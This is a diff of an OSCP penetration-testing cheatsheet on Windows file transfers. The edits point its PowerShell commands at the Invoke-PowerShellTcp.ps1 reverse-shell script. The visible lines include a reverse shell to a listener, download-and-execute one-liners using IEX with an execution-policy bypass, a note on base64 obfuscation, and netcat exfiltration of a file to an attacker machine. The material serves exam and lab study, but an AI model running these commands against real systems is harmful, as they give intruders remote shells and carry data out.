@@ -1,6 +1,6 @@
 ---
 title: Windows File Transfers
-author: sKyW1per 
+author: sKyW1per
 category: "OSCP"
 date: "2021-03-10 00:01"
 tags: [OSCP, Cheatsheet]
@@ -40,16 +40,16 @@ $ Invoke-PowerShellTcp.ps1 -Reverse -IPAddress 192.168.1.1 -Port 443
 
 Execute exe
 $ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro
-file -File file.ps1
+file -File Invoke-PowerShellTcp.ps1
 
 Download and execute immediately
 $ powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString('
-http://192.168.1.1/file.exe')
+http://192.168.1.1/Invoke-PowerShellTcp.ps1')
 $ powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('
-http://192.168.1.1/file.exe')
+http://192.168.1.1/Invoke-PowerShellTcp.ps1')
 
 or newer variant:
-$ powershell.exe -c 'IEX(IWR http://10.10.10.10/file.ps1 -UseBasicParsing)'
+$ powershell.exe -c 'IEX(IWR http://10.10.10.10/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'
 
 
 base64 encoding to avoid badchars or to obfuscate:
@@ -86,5 +86,4 @@ On the attacker system:
 $ nc -lvp 80 > file.txt
 On the target system:
 $ cmd.exe /c ".\nc.exe -w 3 192.168.1.1 80 < file.txt"
-
 ```
